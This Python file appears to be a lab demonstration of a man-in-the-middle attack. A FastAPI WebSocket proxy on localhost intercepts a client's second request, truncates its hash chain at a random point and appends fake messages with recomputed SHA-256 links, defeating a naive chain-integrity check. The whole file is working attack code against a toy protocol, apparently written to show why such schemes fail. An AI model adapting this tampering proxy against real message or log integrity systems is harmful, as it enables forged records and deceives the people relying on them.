from fastapi import FastAPI, WebSocket
import websockets
import hashlib
import uvicorn
import json
import random

app = FastAPI()

SERVER_URI = "ws://127.0.0.1:8000/ws"

# ---------------- HASH ----------------
def hash_func(data):
    return hashlib.sha256(data.encode()).hexdigest()

# ---------------- ATTACK ----------------
def rebinding_attack(messages, chain):
    print("\n[ATTACKER] ⚔️ REBINDING ATTACK STARTED")

    if len(messages) < 3:
        print("❌ Chain too small for attack")
        return messages, chain

    # Random truncation
    k = random.randint(1, len(messages) - 2)
    print(f"[ATTACKER] 🎯 Random truncation k = {k}")

    new_messages = messages[:-k]
    new_chain = chain[:-k]

    print("[ATTACKER] After truncation:", new_messages)

    # Add fake entries
    fake_msgs = ["X", "Y"]
    print("[ATTACKER] Adding fake messages:", fake_msgs)

    for fm in fake_msgs:
        new_hash = hash_func(fm + new_chain[-1])
        print(f"  H({fm} + prev_hash) → {new_hash[:12]}...")
        new_chain.append(new_hash)
        new_messages.append(fm)

    print("[ATTACKER] ✅ Fake chain created")

    return new_messages, new_chain


# ---------------- PROXY ----------------
@app.websocket("/ws")
async def proxy(ws_client: WebSocket):
    await ws_client.accept()
    print("\n[ATTACKER] 🕵️ Client connected")

    async with websockets.connect(SERVER_URI) as ws_server:

        # -------- FIRST REQUEST (PASS THROUGH) --------
        data = await ws_client.receive_text()
        print("[ATTACKER] 📡 Forwarding first request (no modification)")

        await ws_server.send(data)
        resp = await ws_server.recv()
        await ws_client.send_text(resp)

        # -------- SECOND REQUEST (ATTACK) --------
        data = await ws_client.receive_text()
        parsed = json.loads(data)

        messages = parsed["messages"]
        chain = parsed["chain"]

        print("\n[ATTACKER] 📡 Intercepting and modifying second request")

        new_messages, new_chain = rebinding_attack(messages, chain)

        print("\n[ATTACKER] 🚀 Sending MODIFIED chain")

        await ws_server.send(json.dumps({
            "messages": new_messages,
            "chain": new_chain
        }))

        resp = await ws_server.recv()
        await ws_client.send_text(resp)


# ---------------- RUN ----------------
if __name__ == "__main__":
    print("🚀 Starting Attacker Proxy (Naive)...")
    uvicorn.run(app, host="127.0.0.1", port=8001)